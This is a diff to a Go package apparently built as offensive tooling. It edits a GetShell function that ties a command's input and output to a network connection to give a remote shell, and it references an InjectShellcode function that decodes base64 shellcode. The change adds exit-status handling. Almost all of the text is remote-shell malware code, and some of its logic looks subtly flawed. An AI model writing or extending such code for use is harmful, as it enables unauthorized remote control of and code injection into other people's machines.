@@ -4,6 +4,7 @@ package remoteop
 
 import (
 	"encoding/base64"
+	"fmt"
 	"io"
 	"log"
 	"net"
@@ -18,7 +19,7 @@ func GetShell(conn net.Conn) {
 	cmd.Stderr = conn
 	cmd.Stdout = conn
 	cmd.Stdin = conn
-	_ = cmd.Run()
+	exitstatus := cmd.Run()
 
 	copydata := func(r io.Reader, w io.Writer) {
 		_, err := io.Copy(w, r)
@@ -30,6 +31,22 @@ func GetShell(conn net.Conn) {
 	go copydata(cmd.Stdin, conn)
 	go copydata(conn, cmd.Stdout)
 	go copydata(conn, cmd.Stderr)
+
+	exitSignal := make(chan int, 1)
+	closeCheck := func() {
+		if exitstatus == nil {
+			fmt.Println("** Process Exited. **\n")
+			exitSignal <- 1
+		} else {
+			fmt.Println("** Process Unexpected Exited. ** \n")
+			exitSignal <- 2
+		}
+	}
+	go closeCheck()
+	exitData := <- exitSignal
+	if exitData == 1 || exitData == 2{
+		return
+	}
 }
 
 // InjectShellcode decodes base64 encoded shellcode
